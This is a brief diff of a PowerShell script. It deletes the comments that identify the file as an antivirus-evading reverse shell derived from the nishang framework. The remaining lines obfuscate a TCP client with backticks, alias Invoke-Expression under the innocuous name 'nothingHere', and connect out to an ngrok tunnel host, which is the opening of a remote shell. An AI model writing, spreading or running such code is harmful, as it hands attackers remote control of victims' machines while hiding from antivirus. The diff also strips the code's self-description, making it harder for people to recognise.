@@ -1,5 +1,3 @@
-#Twitter: @TihanyiNorbert (No AV detecetion 2022 June)
-#Reverse shell based on the original nishang Framework written by @nikhil_mitt.
 Set-Alias -Name K -Value Out-String
 Set-Alias -Name nothingHere -Value iex
 $BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"("8.tcp.ngrok.io",12963);
